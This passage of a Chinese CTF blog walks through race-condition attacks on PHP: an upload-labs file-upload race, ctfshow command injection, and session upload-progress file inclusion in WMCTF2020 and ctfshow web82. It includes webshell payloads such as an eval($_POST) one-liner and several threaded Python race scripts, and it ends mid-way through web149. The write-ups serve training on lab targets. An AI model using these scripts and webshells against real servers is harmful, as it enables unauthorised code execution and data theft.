class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))<span class="hljs-comment">//移动到新文件夹</span><br></code></pre></td></tr></table></figure><p>绕过思路是利用代码执行过程有耗费时间的过程，上传速度大于匹配unlink条件就能显示webshell界面</p><p><strong>方法一</strong>：使用brup抓包</p><p>使用burpsuite抓包上传shell.php，一直重放上传文件</p><p>shell.php内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;pass.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只要访问了shell.php文件，php文件就会成功解析执行，自动创建一个pass.php，写入一句话木马：<code>&lt;?php phpinfo();?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210414203927555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后Send to lntruder，并且进行以下的设置<br><img src="https://img-blog.csdnimg.cn/20210426193037110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Payload设置<br><img src="https://img-blog.csdnimg.cn/20210426193244134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后不停访问<code>http://localhost/upload-labs/upload/shell.php</code>，爆破结束后，访问pass.php，出现phpinfo信息，shell上传成功<img src="https://img-blog.csdnimg.cn/20210426193746282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>方法二</strong>：pytho多线程上传</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">td</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):</span><br>    url = <span class="hljs-string">&#x27;http://localhost/upload-labs/Pass-17/index.php&#x27;</span><br>    files = &#123;<span class="hljs-string">&#x27;upload_file&#x27;</span>: (<br>        <span class="hljs-string">&#x27;shell2.php&#x27;</span>, <span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;pass2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>)&#125;<br>    data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;上传&#x27;</span>&#125;<br>    r = requests.post(url=url, data=data, files=files)<br>    re = requests.get(<span class="hljs-string">&#x27;http://localhost/upload-labs/upload/shell2.php&#x27;</span>)<br>    <span class="hljs-keyword">if</span> re.status_code == <span class="hljs-number">200</span>:<br>        print(<span class="hljs-string">&#x27;上传成功&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> p:<br>        p.<span class="hljs-built_in">map</span>(td, <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>))<br></code></pre></td></tr></table></figure><p>访问pass2.php，也能看到phpinfo页面<br><img src="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhsow-大牛杯-web-checkin"><a href="#ctfhsow-大牛杯-web-checkin" class="headerlink" title="ctfhsow [大牛杯]-web_checkin"></a>ctfhsow [大牛杯]-web_checkin</h3><p>看<a href="https://blog.csdn.net/miuzzx/article/details/116352564">羽师傅</a>的大牛杯wp，发现用到了条件竞争漏洞，照着wp复现一下。</p><p>随便传参一个code=1,F12查看源码，注释提示仅允许index.php存在，删除所有其他文件，从这句话里可以猜测含有条件竞争漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- 仅允许index.php存在，删除所有其他文件 --&gt;<br>xi nei~<br></code></pre></td></tr></table></figure><p>查看所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09*`<br></code></pre></td></tr></table></figure><p>读取到部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`nl*`<br> <span class="hljs-number">2</span><span class="hljs-meta">?&gt;</span><br> <span class="hljs-number">3</span><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-number">4</span>    opendir(<span class="hljs-string">&quot;./&quot;</span>);<br> <span class="hljs-number">5</span>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$filename</span> = readdir()) &#123;<br> <span class="hljs-number">6</span>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;..&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> != <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br> <span class="hljs-number">7</span>            unlink(<span class="hljs-variable">$filename</span>);<br> <span class="hljs-number">8</span>        &#125;<br> <span class="hljs-number">9</span>    &#125;<br><span class="hljs-number">10</span>    closedir();<br><span class="hljs-number">11</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成文件atkx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=`nl%09/*&gt;atkx`<br></code></pre></td></tr></table></figure><p>直接使用羽师傅的脚本进行条件竞争，将源码写入atkx中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment">#author: yu2xx</span><br>import requests<br>import threading<br>import sys<br>session=requests.session()<br>url1=<span class="hljs-string">&quot;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/&quot;</span><br>url2=<span class="hljs-string">&#x27;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/atkx&#x27;</span><br>def write():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url1)<br>def read():<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = session.get(url2)<br><span class="hljs-keyword">if</span> len(r.text)!=<span class="hljs-number">9561</span>: <span class="hljs-comment">#随便get传一次就能得到这个长度</span><br>    <span class="hljs-keyword">print</span>(r.text)<br><br>threads = [threading.Thread(target=write),<br>       threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t in threads:<br>t.start()<br></code></pre></td></tr></table></figure><p>然后访问atkx可以读取到源码<br><img src="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>想要得到flag的话，直接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09/*<br></code></pre></td></tr></table></figure><h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>考查</strong>：利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>进行文件包含</p><ul><li>前提: 需要知道session文件的存放位置。</li><li>思路: 利用session.upload_progress将恶意语句写入session文件，从而包含session文件。</li></ul><p>session.upload_progress 是PHP5.4的新特征。<br><img src="https://img-blog.csdnimg.cn/2021052021583531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>php.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span>session.use_strict_mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。<span class="hljs-number">1.</span> session.upload_progress.enabled = on<br>enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；<br><br><span class="hljs-number">2.</span> session.upload_progress.cleanup = on<br>cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<br><br><span class="hljs-number">3.</span> session.upload_progress.prefix = <span class="hljs-string">&quot;upload_progress_&quot;</span><br>prefix+name将表示为session中的键名<br><br><span class="hljs-number">4.</span> session.upload_progress.name = <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br>name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；<br><br><span class="hljs-number">5.</span>session.use_strict_mode=off<br>这个选项默认值为off，表示对Cookie中sessionid可控。<br></code></pre></td></tr></table></figure><p>一个上传进度数组的结构的例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">#PHPSESSION = Sn0w<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&lt;?php echo ini_get(&quot;</span><span class="hljs-attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;<br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在session中存放的数据<br><img src="https://img-blog.csdnimg.cn/2021052022111369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在<code>session.upload_progress.name=&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</code>的条件下,上传文件，便会在<code>session[&#39;upload_progress_123&#39;]</code>中储存一些本次上传相关的信息,储存在<code>/tmp/sess_Sn0w</code>中</p><p>Session的默认保存路径<br>在php.ini里的配置session.save_path是注释掉的，那么Seesion保存的路径在不同类型操作系统保存在什么位置？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Linux：<br>/tmp 或 /var/lib/php/session<br><br>Windows：<br>C:\WINDOWS\Temp<br></code></pre></td></tr></table></figure><p>在本地phpstudy中找到session的存储位置<br><img src="https://img-blog.csdnimg.cn/20210520220749657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>理论具体参考：<a href="https://www.yuque.com/u5013914/sn0w/blh341#LbWIR">https://www.yuque.com/u5013914/sn0w/blh341#LbWIR</a></p><p>解题方法1：burpsite条件竞争</p><p>本地html向指定网址上传文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://f0ea2244-d2b8-43be-8ec6-f61da1585183.chall.ctf.show:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>bp设置，Cookie里设置<code>PHPSESSID=flag</code>，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>，利用session.upload_progress写入恶意语句<br><img src="https://img-blog.csdnimg.cn/2021052013092414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>GET方式访问?file=/tmp/sess_flag<br><img src="https://img-blog.csdnimg.cn/20210520130945799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在默认情况下，<code>session.upload_progress.cleanup</code>是开启的，一旦读取了所有POST数据，它就会清除进度信息，利用条件竞争应付这种情况<br><img src="https://img-blog.csdnimg.cn/20210520131009940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>知道目录文件名为flag.php，修改一句话木马为cat flag.php,继续竞争读取flag<br><img src="https://img-blog.csdnimg.cn/20210520131709942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解题方法2：python脚本实现竞争</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://352c5d9e-8728-47e3-b3e5-7e8934e06141.node3.buuoj.cn/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>读到flag.php<br><img src="https://img-blog.csdnimg.cn/20210520223912589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改一句话木马为cat flag.php，读取flag<br><img src="https://img-blog.csdnimg.cn/20210520224545601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhshow-web入门-web82"><a href="#ctfhshow-web入门-web82" class="headerlink" title="ctfhshow [web入门]-web82"></a>ctfhshow [web入门]-web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们利用PHP_SESSION_UPLOAD_PROGRESS和条件竞争进行文件包含。</p><p>和上面题一样，直接一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://4bd1dd58-0b1c-4019-8f55-44ad4dbea031.challenge.ctf.show:8080/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>接下来修改代码读取fl0g.php<br><img src="https://img-blog.csdnimg.cn/2021052022574475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhshow-web入门-web149"><a href="#ctfhshow-web入门-web149" class="headerlink" title="ctfhshow [web入门]-web149"></a>ctfhshow [web入门]-web149</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 